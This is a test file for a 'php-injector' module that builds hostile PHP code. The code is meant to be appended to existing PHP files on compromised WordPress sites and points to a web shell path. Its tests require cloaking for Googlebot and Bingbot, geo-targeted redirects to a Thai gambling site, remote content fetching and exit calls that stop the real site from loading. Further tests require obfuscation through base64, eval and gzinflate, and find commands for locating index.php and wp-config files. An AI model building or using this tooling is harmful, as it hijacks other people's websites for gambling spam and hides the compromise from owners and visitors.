import { describe, it, expect } from "vitest";
import {
  generateInjectionCode,
  generateObfuscatedInjection,
  getFileFinderCommands,
  type InjectionConfig,
} from "./php-injector";

const baseConfig: InjectionConfig = {
  shellUrl: "https://example.com/wp-content/uploads/cache.php",
  contentCdnUrl: "https://cdn.example.com/seo-content/landing.html",
  redirectUrl: "https://gambling-site.com",
  primaryKeyword: "สล็อต",
  keywords: ["สล็อต", "บาคาร่า", "หวย"],
  brandName: "SlotXO",
  geoTargetCountries: ["TH", "VN"],
};

describe("PHP Injector", () => {
  describe("generateInjectionCode", () => {
    it("should generate valid PHP code", () => {
      const code = generateInjectionCode(baseConfig);
      // Injection code is appended to existing PHP files, so may not have <?php tag
      expect(code).toBeTruthy();
      expect(code).toContain("exit");
    });

    it("should include UA detection for Googlebot", () => {
      const code = generateInjectionCode(baseConfig);
      expect(code.toLowerCase()).toMatch(/googlebot|google/i);
    });

    it("should include UA detection for Bingbot", () => {
      const code = generateInjectionCode(baseConfig);
      expect(code.toLowerCase()).toMatch(/bingbot|bing/i);
    });

    it("should include GeoIP detection", () => {
      const code = generateInjectionCode(baseConfig);
      // Should reference geo/country detection
      expect(code.toLowerCase()).toMatch(/geo|country|ip-api|geoip/i);
    });

    it("should include CDN URL for content fetching", () => {
      const code = generateInjectionCode(baseConfig);
      expect(code).toContain("cdn.example.com");
    });

    it("should include redirect URL", () => {
      const code = generateInjectionCode(baseConfig);
      expect(code).toContain("gambling-site.com");
    });

    it("should include target countries", () => {
      const code = generateInjectionCode(baseConfig);
      expect(code).toContain("TH");
    });

    it("should include exit statement to prevent original site loading", () => {
      const code = generateInjectionCode(baseConfig);
      // Must have exit; or die; to stop original site from loading
      expect(code).toMatch(/exit|die/);
    });

    it("should include curl for remote content fetching", () => {
      const code = generateInjectionCode(baseConfig);
      expect(code.toLowerCase()).toMatch(/curl|file_get_contents|fetch/i);
    });
  });

  describe("generateObfuscatedInjection", () => {
    it("should generate obfuscated PHP code", () => {
      const code = generateObfuscatedInjection(baseConfig);
      // Obfuscated code may not have <?php tag - it's meant to be injected into existing PHP files
      expect(code).toBeTruthy();
      expect(code.length).toBeGreaterThan(50);
    });

    it("should be different from non-obfuscated version", () => {
      const plain = generateInjectionCode(baseConfig);
      const obfuscated = generateObfuscatedInjection(baseConfig);
      // Obfuscated should use encoding/compression
      expect(obfuscated).not.toBe(plain);
    });

    it("should use obfuscation techniques", () => {
      const code = generateObfuscatedInjection(baseConfig);
      // Should use base64_decode, eval, or similar obfuscation
      expect(code.toLowerCase()).toMatch(/base64|eval|gzinflate|str_rot13|gzuncompress|decode/i);
    });
  });

  describe("getFileFinderCommands", () => {
    it("should return array of shell commands", () => {
      const commands = getFileFinderCommands();
      expect(Array.isArray(commands)).toBe(true);
      expect(commands.length).toBeGreaterThan(0);
    });

    it("should include find command for PHP files", () => {
      const commands = getFileFinderCommands();
      const hasFind = commands.some(cmd => cmd.includes("find") && cmd.includes(".php"));
      expect(hasFind).toBe(true);
    });

    it("should target common WordPress files", () => {
      const commands = getFileFinderCommands();
      const allCommands = commands.join(" ");
      // Should look for index.php or wp-blog-header.php
      expect(allCommands.toLowerCase()).toMatch(/index\.php|wp-blog-header|wp-config/i);
    });
  });
});
